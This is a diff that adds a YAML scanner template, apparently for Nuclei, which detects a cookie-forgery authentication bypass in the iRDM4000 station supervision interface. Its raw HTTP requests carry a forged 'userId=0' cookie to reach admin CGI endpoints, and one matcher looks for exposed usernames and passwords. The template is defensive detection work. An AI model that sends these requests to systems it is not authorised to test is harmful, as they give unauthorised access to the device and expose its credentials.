@@ -1,0 +1,67 @@
+id: irdm4000-cookie-bypass
+
+info:
+  name: iRDM4000 Cookie Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    The iRDM4000 smart station room online supervision, diagnosis, and configuration sub-station has a cookie forgery vulnerability, allowing attackers to maliciously log into the operation background.
+  classification:
+    cvss-score: 7.8
+  tags: permission-bypass
+
+variables:
+  filepaths:
+    - dhInfoSet.cgi
+    - httpUrlList.cgi
+    - readWanInfo.cgi
+
+http:
+  - raw:
+      - |
+        GET /cgi-bin/deviceBasicInfo.cgi?0.8258190131650356 HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: rmbUser=false; userId=0
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "upVersion"
+          - "true"
+        part: body
+
+  - raw:
+      - |
+        POST /cgi-bin/dhInfoSet.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: rmbUser=false; userId=0
+        Content-Type: application/x-www-form-urlencoded
+
+        data=
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "userName"
+          - "password"
+        part: body
+
+  - raw:
+      - |
+        GET /cgi-bin/{{filepaths}} HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: rmbUser=false; userId=0
+
+    attack: clusterbomb
+    payloads:
+      filepaths:
+        - "dhInfoSet.cgi"
+        - "httpUrlList.cgi"
+        - "readWanInfo.cgi"
+
+    matchers:
+      - type: status
+        status:
+          - 200
